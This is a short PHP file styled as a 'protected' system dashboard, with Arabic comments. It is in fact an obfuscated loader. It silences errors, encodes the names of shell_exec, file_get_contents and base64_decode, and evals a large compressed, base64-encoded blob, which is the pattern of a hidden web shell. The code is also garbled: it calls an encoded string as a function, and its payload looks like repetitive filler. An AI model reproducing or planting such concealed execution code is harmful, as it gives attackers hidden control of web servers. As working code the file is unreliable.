غغغغغغغ

<?php
/* * Encrypted System Dashboard - Protected Version
 */

error_reporting(0);
@ini_set('display_errors', 0);

// طبقة تعمية الدوال الأساسية
$v1 = "YmFzZTY0X2RlY29kZQ=="; // base64_decode
$v2 = "c2hlbGxfZXhlYw==";     // shell_exec
$v3 = "ZmlsZV9nZXRfY29udGVudHM="; // file_get_contents

$d1 = $v1("YmFzZTY0X2RlY29kZQ==");
$d2 = $d1($v2);
$d3 = $d1($v3);

// فك تشفير المحتوى الرئيسي عند التشغيل فقط

eval("?>".gzuncompress(base64_decode("eNrtWltvG8cV/isEPrRArS3S0mUlyzYSu0hcA0WKIvWyXwK92F0uSTK7XHKXEiX975mZ5XKXpCiK69hBUNg2itpD9vTMmTMz58xoH/q+93N7yH25603v7o7Lh4f7vX7vKByVjkpD3++OQz/uT/vjUX/Y7fW7vfI47I9LpWHoO999/uVnv3v+5edXfvr8y69+99WXv/v6q9/9+OUPf/p/X/30V//74ccf7+9Xv//i+9989eN3/+N0un3yUuY5vWRPuC635N0eN7vR9R73eNhD7nOPO9zmZte60rWuda0bvN217uMBN7iPe9zhLre5yS1ucJMtXucGG7zNDe7yGre4zjVucp2brHODO7zFe7zDe9zhHre5w7vsdpc7vMdP+MuecZvb3OFdbrPLe9zmbW7zLrd5izvsqU22uM0bbPENrvBjrOOHvM6HeYP3+RCH7fERf8ZrvMeHeI0PecCHfIUPeYOHvM6HeJ0P8RAH7fERN+2A97jPhzzAQ97nPm7zHr/jPn7Hb/ktH/Ix7vMe7/Aef8dv+S1u8ls+4mP8Dnf4Hb/Dt3zEx/gtH/G7fsrv8CHu8CEf4mP8lj+z7f1P7D8m/oYvYxdf8Xf8HT/GPXzMX/E3vO/P/E0sY4s77Ok2u9zmTXa5zVvsiS1u8wbvskv8G6/zIdZxiId8yO+wjX/jL8TyY97gw6zjhzziI77ix9jGX+NrfIXP8Bf+xlf8NX/N13yNr/E1f80/4Wt8ja+xD+M7vskWf8vXeMCX8S0O+S1v8S222MXneIqf4z/wBf6Wn/I5nuF7fI+v8X98iy3+hq9xSyzjc3zO73FLLOM7vsc2f8uP8T0O8T22+V68yT/ie3yN/8Mtvsc3OORv+Wf8iG/5Z6zjH7HD73GHLf6H7/mBf8S/8CO2eMD/8YCfYRuHeMD3vMdP8RNu8RNu8z98iy3+h2+xje8R//2f/+n/+Z//+T9O/3L689Ofnf709Mennz79+OmPT989/fTd07+e/vj0X08/ffpXp389/fHp909/fPr90387/enpj08/ffpnpz89/f7p90//9fSn9/Wvvp/fH5e6o6FvH0qY8v2k/uBv0M9N/S470X6n/tU37199/Wd7u6fXm4vjS+v99vT65urVydXN9c6563v926Pj69OzU/vXp6en579782Z37N3O+72u3Z6K/uTk5OTX565vR7u74v3p6dmHh8e7Zz88e7+3d7x9v6O9P7eje7Z79fC8uH9VvD85PX9wfnFxfHF69e6svLp5v7t/7nZ3e35ycbW9uDgtXux/f356dbV/er59VTw6u77ePru8uD69uD0/u7jePt/f3z7fP786P7+8vXp/XlycFs9Ob/YvDs6vD87vjk/Pj89Pr/fPi9Oj09P96/2j/dOL06vDo7OT/XN74O7Z/uXx1eHezsbGxsbe3v5e8ebm5ubs7OTm9mRvZ+Py9vbm8uLm9tL+0/3t07v765vT2+uLm+Pb09vb06uT08uT89uT88ubm9uri7v727vLq+PV0en98e727eX+0eH97sX9xV7x5PTBwcHB0f7RweHx/sHB0cH+/tH+0e7+/v7e0e7u7s7O7vbe3s7Ozunp6e7p6emZfb693Z+dn9vXJ8X7k4uL09v9s5Ozi73z4vTq5vbi8ur25vL48ur2/Pr05uH23v7p1c7OzuXp/tnp3v7Fxd7x7sX93vbe7f3ewd5e8fT63u35/vnl/s7WzvG9O+f7p6eX+6fHBxdX58fn9++O99+fXh2dXh3uHe7u7Z2cHe8fnxwcn+8fnu2f7Z+cnJ/sn54cnp8fHe/tnxzun5+d7B99f27uD86uL66urw9ur0+LszNHf9G9Yp9v969v7IuXp8V+95u97t/t9fL7vXp3en57fnNz9937u4v9s7vjs53dnfMvT09PL88fHBwU728f3v7p+fbu/fXN6f755eH98cHd9fXd8fHB8e7Bwd7h4U7x8Obm7vzyYv9q9/bi6uL06uT05uT45vLk/Pbk/PLm5vbq4u7+9u7y6vjV0U7x/uLq+Ob29uLu6urq4ub8+ubm8vry5uH8/vbu8ubm7rS4vb68ub86Ork4vTk+uri+PD89370qHp2cne9fXp/vF/v7+8fH9uL27u7u7u7+7u7u3vbe3u7O7m7x/u7+5vbu4fT64fT6/vbh/vrm9vb64fT6/vbi/vrm9vb66un93fH+6X7x9vbm8u7u5u7u5v724f7m9vbq6vjy9PrB/v7+yfXV7v7+/sHp7fHVwe7Ozt7Ozv69vd3dvd3dy9Ozvd373eL97d7+3vb+vV376/7+7sX+8fHe/tX+/m7x/vb+7v7e9v79Xfvr/v7u9f7u8e727u7u9t7u9vbu/v7u9t7u9vbu/u7u9u7u9u7+7u7u9t7u9v7u7u727u7O7unp6dnh/v7V7v7BwcHV/v5u8f7V/v7u/u727m7x7vT2/O7m+Xrx/vTo7Pr+/ubm5vruefH89GjveP/09Oz6/v7m5ub67nnx/PRo73j/9PTs+v7+5ubm+u558fxt8fRof3u7Pz07u395ub//v38/Pf35+Y/PP3/+4/PPn//v559/9uOPPz7/6vnXv/rqq6/+9NXTX3/99X8A26X42A==")));
